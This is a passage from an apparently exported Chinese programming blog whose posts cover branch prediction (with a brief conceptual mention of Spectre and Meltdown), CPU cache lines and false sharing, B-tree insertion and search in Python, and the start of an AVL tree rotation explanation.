last-\u0026gt;next = new my_node(); last = last-\u0026gt;next; } length++; } } my_list; void sum_sentinel(my_list list) { int sum = 0; for (auto cur = list.head; cur != nullptr; cur = cur-\u0026gt;next) { sum += cur-\u0026gt;value; } } void sum_counter(my_list list) { int sum = 0; my_node *cur = list.head; for (int i = 0; i \u0026lt; list.length; cur = cur-\u0026gt;next, i++) { sum += cur-\u0026gt;value; } } int main(void) { vector\u0026lt;my_list\u0026gt; lists; lists.resize(10000000); random_device rd; mt19937 gen(rd()); uniform_int_distribution\u0026lt;int\u0026gt; dist(0, 10); for (auto \u0026amp;list : lists) { auto node_count = dist(gen); for (int i = 0; i \u0026lt; node_count; i++) { list.append(); } } benchmark(\u0026#34;sentinel\u0026#34;, 100, [\u0026amp;lists]() { for (auto list : lists) { sum_sentinel(list); } }); benchmark(\u0026#34;counter\u0026#34;, 100, [\u0026amp;lists]() { for (auto list : lists) { sum_counter(list); } }); return 0; }   输出结果\n1 2  sentinel avg: 471ms best: 470ms worst: 502ms total: 47178ms counter avg: 407ms best: 402ms worst: 512ms total: 40726ms   这简直是黑魔法！sum_counter明显需要执行更多的指令，但执行速度比指令更少的sum_sentinel平均快70ms！\n造成慢的原因是一样的，因为分支预测失败，我们以上面的4阶段流水线来分析，假设每个阶段要一个时钟周期，等CPU发现取错了指令（比如译码完了add，发现cur!=nullptr是F），于是浪费了两个时钟周期。这被称为 front end bubble 。参考 cloud flare 的这篇博客，branch predictor 。这个 front end 指的是 CPU 微架构中流水线的前端，形象地看，流水线就像是一节一节的水管，指令填满每一节水管，流向下一节。分支预测失败就像是中间一节水管突然空了，后面的指令继续推着空气（预测错误的指令）往前走，就成了水管里的一个泡泡。\n但 sum_counter 快的原因更神奇：因为指令排列的顺序，让分支预测依赖的指令更早进入流水线，因此分支指令进入流水线后，分支预测会更快发现预测错误。见下面的汇编代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  \u0026lt;sum_sentinel(list_head)\u0026gt;: test rsi,rsi je 1fe \u0026lt;sum_sentinel(list_head)+0x1e\u0026gt; xor eax,eax loop: add eax,DWORD PTR [rsi] ; --- 1 mov rsi,QWORD PTR [rsi+0x8] ; --- 2 test rsi,rsi ; --- 3 jne loop ; --- 4 cdqe ; --- 5 ret ; --- 6  \u0026lt;sum_counter(list_head)\u0026gt;: test edi,edi jle 1d0 \u0026lt;sum_counter(list_head)+0x20\u0026gt; xor edx,edx xor eax,eax loop: add edx,0x1 ; --- 1 add eax,DWORD PTR [rsi] ; --- 2 mov rsi,QWORD PTR [rsi+0x8] ; --- 3 cmp edi,edx ; --- 4 jne loop: ; --- 5 cdqe ; --- 6 ret   想象有一颗 CPU 有 5 级流水线（IF、ID、EX、MEM、WB），如上标注的顺序执行。\n在 sum_sentinel 中，开始对 (5) 取指时，(1)才完成写回。对(6)取指时，(2)才写回。等到(3)写回，CPU才发现错误，于是从(4)往后的4级流水线全部作废清空，空泡形成。按每一级1周期算的话，就浪费了4个周期。\n在sum_counter中，对(5)取指时，(1)已经写回。(4)依赖的寄存器数据就绪，立刻就能确定分支预测结果正确与否，没有浪费时钟周期。\n——以上都是想象中的 CPU ，想象中的流水线，实际上的流水线在哪个阶段才能发现分支预测错误，清空流水线，我也不知道。这里能提出的一个论点就是：尽早让分支依赖的数据就绪，尽快让 CPU 发现预测结果不正确，可能可以降低分支预测失败的损失。话不能说满。而且针对分支预测器做优化不值得，Igor Ostrvsky 的博客前车之鉴在那里，过几年新架构 CPU 分支预测器说不定就不是这个规律了也不一定。\n分支预测对安全的影响 spectre 也许有人会想CPU和安全有什么关系，这不是搞笑吗。但实际上对 CPU 漏洞的利用早已有之，对现代 CPU 高效运行的重要特性：缓存、乱序执行、分支预测进行攻击。近些年最著名的就有 Meltdown 和 Spectre 。\n在 Spectre Attacks: Exploiting Speculative Execution 论文里这样写道：\n Modern processors use branch prediction and speculative execution to maximize performance. For example, if the destination of a branch depends on a memory value that is in the process of being read, CPUs will try to guess the destination and attempt to execute ahead. When the memory value finally arrives, the CPU either discards or commits the speculative computation. Speculative logic is unfaithful in how it executes, can access the victim’s memory and registers, and can perform operations with measurable side effects.\n 现代处理器使用分支预测和推测执行来最大化性能。举例来说，如果确定目标分支依赖于读取内存里的值，CPU会在执行前猜测其目标。当内存里的值抵达CPU，CPU要么抛弃，要么提交推测执行的结果。而推测执行的逻辑是不安全的，可能访问到受害程序的内存和寄存器，执行有明显副作用的操作。\nMeltdown 和 Spectre 的利用方式很类似，利用乱序执行或分支预测让 CPU 加载一块不属于自己的内存到缓存，而 CPU 发现分支预测失败或乱序执行无效时，并不会抛弃这块缓存。之后再通过瞬态指令创建一个旁路，取得缓存里的数据，就成功利用CPU绕开了隔离机制，非法读取到了任意一块内存。\nmeltdown paper summary 可以读一下。\n总结 就是聊天，我也不敢说写得有多少对，写博客的过程里东查西找，最后写完有个基本映像就很开心了。\n分支预测对性能有影响，比起 cache line 的影响更小，而且优化价值不大，特意做优化反而可能在未来砸自己脚趾头。但分支预测又确实在现代cpu里起到了相当重要的作用，流水线造得再长，分支预测次次都错，那再长的流水线也和单周期没啥区别。\n这篇感觉没啥好总结的，反正写完是对计算机了解更深了一点就对啦。\n","date":"2022-02-16T16:00:00+08:00","permalink":"https://nnnewb.github.io/blog/p/how-branch-prediction-effects-executoin-performance-and-security/","title":"分支预测对执行效率和安全的影响"},{"content":"前言 看B树的时候发现对缓存还是不够了解，但 cache line 又很神奇。要是有些比较吃CPU的代码改一下结构和访问方式啥的就能白嫖个50%性能提升那岂不是美哉。结合下面的参考文章大概聊一下。\n Gallery of Processor Cache Effects  缓存行 介绍 首先，缓存行不是“行”，这是对 cache line 的直译，cache line 和 cache block 是同义的，忽略这个“行”字即可。\ncache line 指的是 CPU 高速缓存（L1~L3）中的一个缓存块，通常大小在 32/64/128 bytes ，现在常见的应该是 64 bytes 。cache line 之所以重要，是因为这是 CPU 访问主存的必经之路，频繁访问主存数据的场合，或者并发编程时，cache line 的影响还是不容忽视的。\n简单的基准测试 光是说 cache line 多重要没有卵用，写个 demo 看看 cache line 的影响更直观。来一个最简单不过的单链表遍历。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  #include \u0026lt;chrono\u0026gt;#include \u0026lt;cstddef\u0026gt;#include \u0026lt;functional\u0026gt;#include \u0026lt;iostream\u0026gt;#include \u0026lt;iterator\u0026gt;#include \u0026lt;ostream\u0026gt;#include \u0026lt;string\u0026gt; using namespace std; using namespace std::chrono; typedef struct _data { struct _data *next; int value; } mydata; void time_it(const std::string name, function\u0026lt;void(void)\u0026gt; fn) { auto start = system_clock::now(); fn(); auto stop = system_clock::now(); cout \u0026lt;\u0026lt; name \u0026lt;\u0026lt; \u0026#34;: \u0026#34; \u0026lt;\u0026lt; duration_cast\u0026lt;milliseconds\u0026gt;(stop - start).count() \u0026lt;\u0026lt; \u0026#34;ms\u0026#34; \u0026lt;\u0026lt; endl; } int main(void) { // 一次分配，内存连续  auto list1 = new mydata[1024 * 1024 * 64]; auto cur = list1; for (int i = 0; i \u0026lt; 1024 * 1024 * 64 - 1; i++) { cur-\u0026gt;next = \u0026amp;list1[i + 1]; cur = cur-\u0026gt;next; } list1[1024 * 1024 - 1].next = NULL; // 分别分配，内存不连续  auto list2 = new mydata(); auto cur2 = list2; for (int i = 0; i \u0026lt; 1024 * 1024 * 64 - 1; i++) { cur2-\u0026gt;next = new mydata(); cur2 = cur2-\u0026gt;next; } // 遍历连续的链表  time_it(\u0026#34;first\u0026#34;, [\u0026amp;]() { for (auto ptr = list1; ptr != NULL; ptr = ptr-\u0026gt;next) { ptr-\u0026gt;value *= 3; } }); // 遍历不连续的链表  time_it(\u0026#34;second\u0026#34;, [\u0026amp;]() { for (auto ptr = list2; ptr != NULL; ptr = ptr-\u0026gt;next) { ptr-\u0026gt;value *= 3; } }); return 0; }   为了体现出差异，一共遍历了 1024*1024*64个元素，每个元素 8 个字节，一共是512M数据。\n结果如下。\n1 2 3 4  weakptr  数据结构  ♥ 09:42  clang++.exe -m32 -O2 main.cpp -o main.exe weakptr  数据结构  ♥ 09:43  ./main.exe first: 2ms second: 239ms   启用了O2级别优化的情况下，遍历连续分配和不连续分配的链表时，速度相差达到了惊人的一百多倍。\n是O2优化掉了第一种连续分配的链表遍历吗？-O0 禁止优化看看。\n1 2 3 4  weakptr  数据结构  ♥ 09:44  clang++.exe -m32 -O0 main.cpp -o main.exe weakptr  数据结构  ♥ 09:45  ./main.exe first: 3ms second: 262ms   并没有任何改善。\n因为考虑是和内存相关，影响内存访问性能的因素可以很自然想到缓存和缺页这两条。\n缓存指的是 cache line，一般说 false sharing 的时候提加 padding 对齐比较多。另一个情况就是遍历的时候，如果数据比较密集，那从主存刷新 cache line 就会更少，缓存利用更充分。所以像是数组这样的连续内存遍历速度通常远比链表之类的结构快。\n缺页又是另一个问题，缺页异常发生的几个常见场景包括：第一次访问分配好的内存，访问被交换到硬盘上的内存，mmap ，以及SIGSEGV等情况。一般来说的话，连续的内存分配下一次缺页可以得到连续的N个元素，不连续的分配第一次访问N个元素，最坏的情况下可能就要N次缺页异常。\n缺页异常 先看缺页。这里使用微软的 Process Explorer 来观察 Page Fault 的出现情况。为了有效观察到page fault发生，我修改了一下代码，在 time_it 函数里添加上了简单的 page fault 观测。\n提示，也可以用 Process Explorer 等工具观测程序运行时的 Page Fault 数量，但直接在代码里嵌入观测还是最准确的。如果有更好用的性能分析工具的话当然更好。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  DWORD getPageFaultCount() { auto proc = GetCurrentProcess(); PROCESS_MEMORY_COUNTERS counters; if (GetProcessMemoryInfo(proc, \u0026amp;counters, sizeof(counters)) == FALSE) { cerr \u0026lt;\u0026lt; \u0026#34;GetProcessMemoryInfo failed, error \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; endl; } return counters.PageFaultCount; } void time_it(const string name, function\u0026lt;void(void)\u0026gt; fn) { auto before = getPageFaultCount(); auto start = system_clock::now(); fn(); auto stop = system_clock::now(); auto after = getPageFaultCount(); cout \u0026lt;\u0026lt; name \u0026lt;\u0026lt; \u0026#34;: \u0026#34; \u0026lt;\u0026lt; duration_cast\u0026lt;milliseconds\u0026gt;(stop - start).count() \u0026lt;\u0026lt; \u0026#34;ms, page fault count: \u0026#34; \u0026lt;\u0026lt; after - before \u0026lt;\u0026lt; endl; }   然后对两个用例进行测试。\n1 2 3 4  initialization-1: 337ms, page fault count: 131329 initialization-2: 3591ms, page fault count: 265660 iteration-1: 3ms, page fault count: 0 iteration-2: 294ms, page fault count: 0   可以清晰地看到，在链表的初始化阶段，非连续分配的链表产生了连续分配的链表差不多两倍的 page fault，耗时接近十倍——我还得澄清一下这不是在暗示十倍的耗时都是 page fault 造成的，但 page fault 在其中也消耗了一部分资源总归是毫无疑问的。\n但随后的迭代阶段里并没有新的 page fault 产生，因为 两次 512M 的分配再加上循环new，堆维护指针的开销，差不多1.5G，还没有耗尽可用内存。\n排除 page fault 的影响后，现在考虑另一个影响因素：缓存。\n缓存行 关于缓存的分析这里使用了 Intel VTune Profiler 作为分析工具，来提取缓存命中情况。为了让VTune抓取更多信息来分析，对benchmark代码再次修改，遍历一次改成遍历100次。\n1 2 3 4 5 6 7  for (int i = 0; i \u0026lt; 100; i++) { time_it(\u0026#34;iteration-2\u0026#34;, [\u0026amp;list2]() { for (auto ptr = list2; ptr != NULL; ptr = ptr-\u0026gt;next) { ptr-\u0026gt;value *= 3; } }); }   并将连续内存分配和不连续分配分成benchmark1.cpp和benchmark2.cpp，分别用-m32 -O0 -g 参数编译，放进 VTune 分析内存访问性能。\n观察图中的 LLC Miss Count 可以发现，Benchmark2 的缓存未命中次数远大于 benchmark1 ，平均时延 Average Latency 高出 13 个cycles 。这如何影响性能呢？继续观察下图 Bottom-up 中的分析。\n能发现，在benchmark1（连续分配链表遍历测试）中，初始化耗时和遍历耗时相仿，都在300ms左右。初始化耗时可能主要来自缺页，每次遍历整个链表仅3ms左右，LLC Miss Count 为 0。这说明缓存完美地发挥了作用。\n在 benchmark2 （循环分配节点，不连续）中，初始化耗时1.4秒，100次遍历耗时26.461秒，而且注意，LLC Miss Count 高达 47,603,332 。将这个数字除以循环次数，大约等于每个节点访问都会产生 0.7 个 LLC Miss 。\n为什么会发生这种事？\nbenchmark1 一次 new 出连续的 1024 * 1024 * 64 个元素，每个元素 8 个字节，连续排列，而且构造链表时是按顺序头尾相连的。所以遍历 benchmark1 的链表时，填充好的 cache line (设为 64字节)一共有8个链表元素且连续，预取机制同时拿了下一个 cache line ，因此 CPU 几乎不用傻等主存给数据，只需要不断一个 cache line 接一个 cache line 读写即可，效率极高。\n而 benchmark2 相反，因为链表中的每个元素都是独立分配的，依据 allocator 算法不同表现会有区别，但比较明确的是元素不大可能是在内存中连续分配。在遍历链表时，取下一个链表元素 cur=cur-\u0026gt;next  后，cur 指向的地址大概率并不在已缓存的 cache line 中，因此每次循环里 CPU 都不得不从主存取数。可是主存取数是L1/L2 缓存取数耗时的成百上千倍，效率极低。\n伪共享 继续之前再说说伪共享。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  #include \u0026lt;cstddef\u0026gt;#include \u0026lt;iostream\u0026gt;#include \u0026lt;thread\u0026gt;#include \u0026lt;functional\u0026gt;#include \u0026lt;chrono\u0026gt; using namespace std; using namespace std::chrono; void time_it(const string name, function\u0026lt;void(void)\u0026gt; fn) { auto start = system_clock::now(); fn(); auto stop = system_clock::now(); cout \u0026lt;\u0026lt; name \u0026lt;\u0026lt; \u0026#34;: \u0026#34; \u0026lt;\u0026lt; duration_cast\u0026lt;milliseconds\u0026gt;(stop - start).count() \u0026lt;\u0026lt; \u0026#34;ms\u0026#34; \u0026lt;\u0026lt; endl; } void f(int *data) { for (int i = 0; i \u0026lt; 10000000; i++) { *data += 100; } } int main(void) { for (int i = 0; i \u0026lt; 100; i++) { time_it(\u0026#34;iteration\u0026#34;, []() { int a = 0, b = 0, c = 0, d = 0; thread *threads[4] = { new thread(f, \u0026amp;a), new thread(f, \u0026amp;b), new thread(f, \u0026amp;c), new thread(f, \u0026amp;d), }; for (auto t : threads) { t-\u0026gt;join(); } }); } return 0; }   依然是一个很简单的 benchmark，输出如下。\n1 2 3 4 5 6 7  iteration: 172ms iteration: 176ms iteration: 181ms iteration: 177ms iteration: 182ms iteration: 179ms ... 略   一个非常简单的操作，4线程无锁，无 volatile 递增不同的四个变量，几乎看不出有什么约束导致性能低下的问题。我们通过 Intel VTune 来看看。\n可以看到，VTune 提示CPU花费了大量时间在傻等 cache line 写入主存。\n函数 f 出现了海量的 loads/store 操作。\n在前文中我们聊了 cache line 的作用，这里也能看到 LLC Miss 为 0，那么为什么运行性能会这么差呢？\n这个问题还得回到 cache line 上。在多核系统中，cache line 还要求 一致性 ，一旦写 cache line 中的任意字节，都会让 整个 cache line 标记为失效。在基准测试代码里，四个 int 变量被连续分配在栈上，也就是说 cache line 极有可能将这四个变量中的多个保存在同一 cache line 内。任意一个线程修改了其中一个变量，都会导致 cache line 被标为失效，其他线程或核心想要访问这四个变量之一都不得不从主存重新取数。\n这么做的原因是为了保证数据一致性。CPU0 修改了 cache line 中的数据，还没有写回主存，其他 CPU 都不清楚 CPU0 做了什么修改，只能等待 CPU0 写回主存（或者L3），再重新从主存（或L3）取数。但我们都知道a、b、c、d并不是共享的，每个线程都只访问自己的那个变量。这种问题被称作伪共享。\n在 VTune 中的表现，就是上图中海量的 Loads/Stores 操作。\n如何解决呢？\n很简单，让每个线程要操作的变量填满整个 cache line，防止因为cache line 里混入和其他线程要修改的变量造成伪共享。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  typedef struct { int8_t _before[60]; int32_t value; int8_t _after[60]; } value; void f(value *data) { for (int i = 0; i \u0026lt; 10000000; i++) { data-\u0026gt;value += 100; } } int main(void) { for (int i = 0; i \u0026lt; 100; i++) { time_it(\u0026#34;iteration\u0026#34;, []() { value a = {0}, b = {0}, c = {0}, d = {0}; thread *threads[4] = { new thread(f, \u0026amp;a), new thread(f, \u0026amp;b), new thread(f, \u0026amp;c), new thread(f, \u0026amp;d), }; for (auto t : threads) { t-\u0026gt;join(); } }); } return 0; }   将原本的 int 改成前后各有 60 字节填充的结构（前60字节防止 value 混入别人的 cache line，后60字节防止value后的变量混入cache line，124字节，对齐后128字节）。这个解决方法是典型的 用空间换时间 。再次运行基准测试，可以看到运行时间缩短了数倍。\n1 2 3 4 5 6 7 8 9 10 11  iteration: 15ms iteration: 21ms iteration: 20ms iteration: 18ms iteration: 20ms iteration: 22ms iteration: 20ms iteration: 19ms iteration: 20ms iteration: 20ms ... 略   cache line 原理 Intel 在 2016 年发表的一篇文章，How Memory Is Accessed这样写道。\n Programming modern computers rarely requires an understanding of underlying hardware and software; consequently, most programmers do not know how the memory subsystem works.\nHowever, such lack of knowledge can ultimately produce a 10x or worse slowdown in application performance – especially since the arrival of new hardware technologies.\n\u0026hellip;\nThe accesses propagating through the memory subsystem are a combination of a specific request and the needed physical addresses and, perhaps, data.\nData moves around most of the memory subsystem in 64-byte quantities called cache lines. A cache entry, which is some transistors that can store a physical address and a cache line, is filled when a cache line is copied into it. Pages are evenly divided into cache lines – the first 64 bytes of a 4096-byte page is a cache line, with the 64 bytes stored together in a cache entry; the next 64 bytes is the next cache line, etc.\nEach cache line may:\n Not be cached Occupy an entry in one cache Be duplicated in several caches  Cores, I/O devices, and other devices send requests to caches to either read or write a cache entry for a physical address. The lowest six bits of the physical address are not sent – they are used by the core to select the bytes within the cache line. The core sends separate requests for each cache line it needs.\n Reads – If a cache has the requested physical address in a cache entry, the cache returns the data. If not, the cache requests the data from deeper in the memory subsystem and evicts some cache entry to make room. If the evicted cache entry has been modified, it must be written to the deeper memory subsystem as part of this eviction. This means a stream of reads may slow down because an earlier set of writes must be pushed deeper into the memory subsystem. A small queue of written data buffers the communication from the sender to the receiver. Writes – If the cache does not have the cache line in a cache entry, the cache reads it from deeper in the memory subsystem. It evicts some other physical address from its cache entry to make room for this cache line. The read is necessary to get all the 64 bytes, because the write is probably changing only some of them. The first time a cache entry is written, the cache entries of this physical address in all other caches are invalidated. This action makes the first write on a cache entry more expensive than later writes.   CPU访问主存时并不是直接从主存取数，而是先读入高速缓存，也就是在CPU的规格说明中提到的 L1/L2/L3 缓存。而且，CPU也不会傻乎乎地只从主存取一个字节、4个字节或8个字节，而是取更多数据放入缓存。\n为什么？因为 局部性原理 。CPU设计者假设程序访问一个地址，则很快也会访问这个地址附近的其他地址。\n这儿有个表格 Numbers everyone should know：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  0.5 ns - CPU L1 dCACHE reference 1 ns - speed-of-light (a photon) travel a 1 ft (30.5cm) distance 5 ns - CPU L1 iCACHE Branch mispredict 7 ns - CPU L2 CACHE reference 71 ns - CPU cross-QPI/NUMA best case on XEON E5-46* 100 ns - MUTEX lock/unlock 100 ns - own DDR MEMORY reference 135 ns - CPU cross-QPI/NUMA best case on XEON E7-* 202 ns - CPU cross-QPI/NUMA worst case on XEON E7-* 325 ns - CPU cross-QPI/NUMA worst case on XEON E5-46* 10,000 ns - Compress 1K bytes with Zippy PROCESS 20,000 ns - Send 2K bytes over 1 Gbps NETWORK 250,000 ns - Read 1 MB sequentially from MEMORY 500,000 ns - Round trip within a same DataCenter 10,000,000 ns - DISK seek 10,000,000 ns - Read 1 MB sequentially from NETWORK 30,000,000 ns - Read 1 MB sequentially from DISK 150,000,000 ns - Send a NETWORK packet CA -\u0026gt; Netherlands | | | | | | | ns| | | us| | ms|   具体数字依赖于具体的硬件平台，这个表格可以对访问速度建立大概的映像。当 L1/L2 缓存未命中，CPU不得不继续向更远、延时更长的设备寻求数据，每个 LLC Miss 都意味着 CPU 不得不花上成百上千倍的时间等待填充 cache line。而 LLC Miss 出现的频率越高，则意味着 CPU 执行的效率越低——绝大部分时间都在等待主存的数据。\n更糟糕的是，有时候 CPU 真的就是傻等(stall)，不专门分析甚至都不知道程序根本没跑出应有的速度。\n Modern cores use both out-of-order execution and hyperthreading to find and to do something useful while other instructions wait for data to be fetched.\nIf nothing useful can be done, the core stalls. Unfortunately, the OS is almost unaware of the stall: the application appears to be running, and it is hard to tell if the application is slower than it should be. You need tools to examine hardware performance counters to see stall details.\n 回顾基准测试代码，仅仅是连续分配内存就可以获得百倍的性能改善，超值。\n引用前文来给 cache line 小节结尾：\n However, such lack of knowledge can ultimately produce a 10x or worse slowdown in application performance – especially since the arrival of new hardware technologies.\n 总结 什么是 cache line？\n Data moves around most of the memory subsystem in 64-byte quantities called cache lines.\n cache line 如何影响性能？\n","date":"2022-02-15T17:11:00+08:00","permalink":"https://nnnewb.github.io/blog/p/cpu-cache-page-fault-and-false-sharing/","title":"CPU缓存、缺页和伪共享"},{"content":"前言 B树和B树的变体（B+树）因为对磁盘IO/缓存友好的原因，常被用做数据库索引和文件系统的数据结构。\n这篇博客主要是写一下B树如何插入和搜索，节点分裂机制以及如何自平衡。\n节点结构 B树和一般的二叉搜索树在节点结构上有很大区别。B树是一种多路搜索树，B树的节点可以有多个后继节点，一个节点会保存多个键。单个节点最多保存M个键的B树称作M阶B树。\n一个简单的 B 树节点结构如下。\n1 2 3 4  class BTreeNode: parent: \u0026#39;BTreeNode\u0026#39; entries: List[int] children: List[\u0026#39;BTreeNode\u0026#39;]   B树要求除根节点外，每个节点最少包含M/2个元素，非叶子节点的 children 数量是 len(entries)+1。根节点不要求最少元素数量，其他约束不变。\n插入节点 B树要求新的键只能在叶子节点上插入。如果叶子节点的键数量超过了上限M，则叶子节点执行 分裂 操作，将键分成三部分：中位数，小于中位数的部分，大于中位数的部分。\n1 2 3 4  # 分裂前 [1,2,3,4,5] # 分裂后 [1,2],3,[4,5]   中位数插入父节点，小于中位数的部分或大于中位数的部分创建新的子节点，插入父级节点。以插入元素 1-7 为例，图示如下。\n对于中位数在 entries 中间的情况不会更麻烦，只要记住新节点保存的都是大于中位数的部分，在entries插入键之后，找到对应的children下标插入即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  def add_child(self, entry, child): \u0026#34;\u0026#34;\u0026#34;非叶子节点添加新元素 Args: entry (int): 新元素 child (BTreeNode): 分裂出的新孩子 \u0026#34;\u0026#34;\u0026#34; # 遍历寻找比新 entry 更大的元素，如果不存在，则新 entry 添加到最后 for i, v in enumerate(self.entries): if v \u0026gt; entry: self.children.insert(i+1, child) self.entries.insert(i, entry) self.grow() return self.entries.append(entry) self.children.append(child) self.grow()   完整代码会在文末给出。\n自平衡 B树是一种自平衡树，B树做到自平衡的方式比较特别。下面的内容都是我个人对B树的理解，偏见警告。\n一般的二叉搜索树插入元素时，会把元素插入到叶子节点上，叶子节点就变成了中间节点，子树会随着插入的元素增长而变高，于是在子树之间出现不平衡。也就是说，一般的二叉搜索树生长方向是向下，往叶子方向扩展。\n但B树正好相反：叶子节点不会变成中间节点，只会分裂兄弟节点，向父级节点插入键。而父级节点也会因为键超过M而分裂，一直到根节点。根节点分裂则会产生新的根，原来的根变成两个兄弟节点，树的高度随之上升。也就是说，B树的生长高度是向上的，插入操作对树高度的影响最终体现为根节点的分裂。\n删除节点的规则也设计为保持这一特性，删除键对树高度的影响最终会体现为根节点和子节点合并，使得树高度降低。\n搜索 B树的搜索和二叉搜索树差不多，不同的是节点会表示多个键，所以二叉搜索树中的比较操作会变成在多个键里查找值，并在中间节点没找到的时候递归搜索子节点。\n1 2 3 4 5 6 7 8 9 10 11 12  def search(self, entry) -\u0026gt; bool: for i, v in enumerate(self.entries): if v == entry: return True # 如果没找到，而且当前元素比搜索值要大了 # 就从小于当前元素的子节点里递归搜索 if len(self.children) \u0026gt; 0 and v \u0026gt; entry: return self.children[i].search(entry) # 没有比搜索的键大的值，则从末尾的子节点（大于本节点全部键）递归搜索 if len(self.children) \u0026gt; 0: return self.children[-1].search(entry) return False   分裂和需要注意的问题 分裂节点写起来很简单，比 AVL 旋转要好懂很多。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  def grow(self): # 检查和处理分裂 # B-Tree 的增长方向是横向+纵向，横向是扩展兄弟节点，纵向是往根节点方向生长 if len(self.entries) \u0026gt; MAXIMUM_ENTRIES: middle = self.entries[MIDDLE_ENTRY_IDX] split_entries = self.entries[MIDDLE_ENTRY_IDX+1:] split_children = self.children[MIDDLE_CHILD_IDX:] self.entries = self.entries[:MIDDLE_ENTRY_IDX] self.children = self.children[:MIDDLE_CHILD_IDX] split_node = BTreeNode(self.parent) split_node.entries = split_entries split_node.children = split_children for child in split_children: child.parent = split_node # 中间节点分裂的情况 if self.parent is not None: self.parent.add_child(middle, split_node) return # 根节点分裂，生成新的根节点 self.parent = BTreeNode(None) split_node.parent = self.parent self.parent.children = [self, split_node] self.parent.entries = [middle]   主要注意：\n 选择合适的中位数。如果M是奇数，M+1除二没有余数，也选不出中位数。 新节点（split_node和split_children）都需要重新调整parent属性，不要漏了。 中间节点的分裂要向上添加一个entry和child，分别表示键和大于这个键的节点。  这是个递归过程，上级节点也可能发生分裂，一直到根分裂。 这个过程会保留原节点（self），可以理解为children的下标i表示children[i]这棵子树所有键小于entries[i]。children[-1]没有对应的entries下标，表示的是大于节点所有键的子树，相当于是二叉搜索树中的右子树。   根节点分裂会导致树的根发生改变，完成插入操作后需要重新确定根节点指针，不然会导致搜索出错或再次分裂的时候往错误的节点添加键，破坏搜索树的性质。  B树性能 B树的性能优势来自树的高度增长相对比较慢，选择合适的阶可以减少磁盘IO次数。另外就是一个节点包含多个键，提高键的储存密度，更符合局部性原理，相对于二叉搜索树来说对CPU缓存也更较友好。\n对这个场景我能想到的几个关键因素主要有：\n 内存缓存。尽可能榨干可用的内存，避免频繁进行磁盘IO。 局部性原理。  其中局部性原理又分几项。\n一个是内存的分页机制，在内存紧张的情况下如果节点集合大小不是一页的整数倍的话，会产生更多的缺页异常，造成更频繁地读盘（考虑使用了交换分区或 windows 页文件，又或者 mmap 等方式读取）。\n另一个是CPU的高速缓存，如果结构填不满或者超出cache line 大小的话都会有影响。\n当然，最后还是具体问题具体分析。给这篇博客找资料的时候看到的这篇文章很不错 gallery of processor cache effects，挺喜欢的。\n总结 b树是多路搜索树。\nb树插入节点总是在叶子，b树向根方向生长。\nb树通过节点分裂和合并实现自平衡。\nb树搜索和一般的二叉搜索树差别不大。\n以及b树性能优势来自树更矮，节点更少，键更集中，符合局部性原理，减少磁盘io次数，合适的阶让结构对缓存更友好。\n","date":"2022-02-14T10:53:00+08:00","permalink":"https://nnnewb.github.io/blog/p/b-tree/","title":"B树"},{"content":"前言 还记得很久以前学数据结构只看到二叉树，讲到平衡，但平衡方法当时看纸质书手头也没有实验环境，后来就没继续学下去。现在有闲就重新捡起来学一下。先从AVL树继续看。\nAVL树 AVL 树是以提出者名字命名的，Adelson-Velskii \u0026amp; Landis，俄国人，后来移居以色列。人怎么样不管啦。\nAVL 树是一种平衡二叉树，左右子树高度差不超过1。保持平衡的方法是每次插入数据的时候发现子树不平衡，就把较高的子树提升为根，把根变成新的根的子树，把较高的子树变矮，较矮的子树变高，实现平衡。这个过程被叫做旋转，下面介绍旋转。\n左旋转/右旋转 左旋转和右旋转的逻辑是一样的。如果右子树比左子树高，就把右子树提升成根。如果左子树比右子树高，就把左子树提升成根。提升右子树叫左旋转，提升左子树叫右旋转。\n把子树提升成根会有点麻烦。比如右子树提升为根，原来的根和左子树怎么办？我们并不想重新平衡树的时候把整个左子树都删掉，那原来的根和左子树就必须插回新的树里。\n我们知道右子树的 key 肯定比根和左子树所有节点大，所以根要插回树的话，一个很直接的想法就是把旧的根接到右子树左下角的叶子节点。\n的确，这样保持了二叉搜索树的特征，但新的树依然不平衡：节点5的左子树高度2，右子树高度0，高度差超过了1。稍微想想就知道，旧的根和左子树直接接到左下角叶子节点的话，会让原本平衡的新树左子树高度增加，进而失去平衡。\n解决方法也很简单，不要把旧的树接到新的树最小值上，而是把新树的左子树，移植成旧树的右子树，再把旧树移植成新树的左子树。这样一来，右子树的左子树和左子树的右子树不管怎么旋转，高度都一样。\n为什么这样可以保持平衡呢？首先AVL树的子树也是AVL树，所以子树的子树之间高度差也不超过1。左旋转、右旋转的的作用是让子树高度一侧升高，一侧降低——注意，左旋转只能降低右儿子的右子树高度，右儿子的左子树高度不变。右旋转只能降低左儿子的左子树高度，左儿子的右子树高度不变。\n举例来说，上图中右儿子的右子树（4-6-7-8）较高，旋转后变成了（6-7-8），而原本的（4-6-5）变成了（6-4-5），高度不变。\n这个规律很好理解，因为原来的右子树变成了根，整个右子树剩下的节点高度都降低了。而右子树的左子树变成了现在的左子树的右子树，和根的距离一样，所以高度不变。\n左旋转让右子树的右子树高度-1，左子树的左子树高度+1。左子树的右子树高度等于右子树的左子树，旋转后新树的左右子树的高度相等。\n双旋转 